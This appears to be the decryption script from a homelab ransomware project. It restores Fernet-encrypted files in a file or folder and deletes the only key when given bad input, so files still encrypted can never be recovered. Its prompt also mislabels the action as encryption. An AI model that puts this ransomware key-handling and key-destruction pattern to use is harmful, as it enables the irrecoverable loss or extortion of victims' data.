#! /usr/bin/env python3
from cryptography.fernet import Fernet
import os

files = []

with open('/home/homelab/Tools/Malware/ransomware/key/thekey.key', 'rb') as key:
    secretkey = key.read()

type = input('Encrypt folder/dir or file?: ')

if type.lower() == 'file':
    path1 = input('Put the file or dir path here: ')
    if os.path.isfile(path1):
        with open(path1, 'rb') as thefile:
            content = thefile.read()
        content_decryted = Fernet(secretkey).decrypt(content)
        with open(path1, 'wb') as thefile:
            thefile.write(content_decryted)
    else:
        print('Wrong path')
        os.remove('/home/homelab/Tools/Malware/ransomware/key/thekey.key')


elif type.lower() == 'folder' or type.lower() == 'dir':
    path2 = input('Put the folder/dir path here: ')
    if os.path.isdir(path2):
        for file in os.listdir(path2):
            if file == 'encrypt.py' or file == 'thekey.key' or file == 'decrypt.py':
                continue
            
            file_path = os.path.join(path2, file) 

            if os.path.isfile(file_path):

                with open(file_path, 'rb') as thefile:
                    contents = thefile.read()
                contents_decryted = Fernet(secretkey).decrypt(contents)
                with open(file_path, 'wb') as thefile:
                    thefile.write(contents_decryted)
    else:
        print('Wrong path')
        os.remove('/home/homelab/Tools/Malware/ransomware/key/thekey.key')

else:
    os.remove('/home/homelab/Tools/Malware/ransomware/key/thekey.key')
    print("We can't handle your situation please try again")
    quit()
